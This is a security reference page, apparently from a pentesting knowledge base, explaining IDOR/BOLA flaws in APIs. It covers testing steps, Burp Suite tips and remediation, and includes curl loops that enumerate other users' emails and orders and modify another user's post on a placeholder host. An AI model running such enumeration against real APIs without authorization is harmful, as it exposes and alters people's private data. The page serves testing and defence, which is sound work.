# Broken Object Level Authorization (BOLA / IDOR)

## Overview
Broken Object Level Authorization (BOLA), also known as Insecure Direct Object Reference (IDOR), is the #1 OWASP API Security vulnerability. It occurs when an API endpoint accepts an object identifier (user ID, order ID, document ID) and returns or modifies the corresponding object without verifying that the requesting user is authorized to access that specific object. Any predictable identifier can be cycled to access other users' data.

## How It Works
- An API endpoint like `GET /api/orders/{order_id}` returns order details.
- The server verifies that the user is authenticated but does not verify that the order belongs to the requesting user.
- If your order ID is 12345, changing it to 12344 returns another user's order.
- Common with sequential or guessable IDs (integers, short UUIDs).
- Also occurs in `PUT`/`DELETE` operations: `DELETE /api/posts/999` deletes someone else's post.

## Impact
- Mass data exfiltration by cycling through all object IDs.
- Unauthorized modification or deletion of other users' data.
- Account takeover via access to password reset tokens, sessions, or profile update endpoints.
- Financial data exposure (orders, invoices, payment methods).
- PII disclosure at scale.

## Where to Look
- Any URL or request body parameter containing an ID:
  - `/api/user/{id}`, `/api/order/{id}`, `/api/invoice/{id}`
  - Request body: `{"post_id": 123}`, `{"document_id": "abc"}`
- Download/view endpoints with file or document IDs.
- Admin functionality exposed to regular users with different IDs.
- Indirect references: `/api/invoice/download?ref=INV-2024-001`.

## Testing Steps
1. Capture a request that includes an object ID (URL path or body).
2. Note your own object ID (e.g., your user ID is 42, your order is 5001).
3. Change the ID to nearby values: 41, 43, 5000, 5002.
4. Check if the response returns another user's data.
5. Try IDs from links you've seen for other users (from shared pages, emails, etc.).
6. Test all HTTP methods: GET (read), PUT/PATCH (update), DELETE (delete).
7. Test GUIDs — even if "unguessable," check if they're reused in email links or shareable URLs.
8. Test indirect references and check if changing the referenced value returns different data.
9. Compare response size/content between your ID and another — even a slight difference confirms the flaw.

## Payloads / Techniques
```bash
# Test IDOR on user profile endpoint
# Your user ID = 100
curl -s https://api.target.com/api/user/100 \
  -H "Authorization: Bearer YOUR_TOKEN"

# Try other users
for id in 99 101 1 2 3 50 1000 9999; do
  echo -n "User $id: "
  curl -s https://api.target.com/api/user/$id \
    -H "Authorization: Bearer YOUR_TOKEN" | \
    python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('email','NO EMAIL'))"
done

# Enumerate orders
for order_id in $(seq 9990 10010); do
  response=$(curl -s -w "%{http_code}" \
    "https://api.target.com/api/orders/$order_id" \
    -H "Authorization: Bearer YOUR_TOKEN")
  status="${response: -3}"
  body="${response%???}"
  if [ "$status" = "200" ]; then
    echo "ORDER $order_id: $body"
  fi
done

# Test IDOR on POST body
curl -s -X PUT https://api.target.com/api/post/update \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"post_id": 999, "content": "Hacked!"}'

# Test IDOR with UUIDs (use ones found in email links, shared URLs)
curl -s "https://api.target.com/api/document/6ba7b810-9dad-11d1-80b4-00c04fd430c8" \
  -H "Authorization: Bearer YOUR_TOKEN"
```

## Burp Suite Tips
- In **Intruder**, use a number payload on object IDs (range 1 to 10000) to enumerate accessible resources.
- Use **Comparer** to detect subtle differences between responses (access granted vs. denied).
- The **Autorize** (BApp Store) extension automatically tests endpoints with different user tokens to detect authorization bypasses.
- In **Repeater**, manually swap IDs from one session to another (two browser windows / two Burp sessions).

## Tools
- Burp Suite Intruder + Autorize (BApp)
- ffuf — fast ID enumeration
- IDOR Hunter — custom scripts for systematic IDOR testing

## Remediation
- Always verify that the authenticated user is authorized to access the specific object being requested.
- Use non-guessable identifiers (UUIDs v4) instead of sequential integers — this reduces risk but is not a fix on its own.
- Implement server-side authorization checks: `if object.owner_id != current_user.id: return 403`.
- Use indirect references: map user-specific tokens to objects server-side rather than exposing database IDs.
- Log and alert on bulk enumeration attempts (many requests cycling through IDs).

## References
https://owasp.org/www-project-api-security/ (API1:2023 Broken Object Level Authorization)
https://portswigger.net/web-security/access-control/idor
https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html
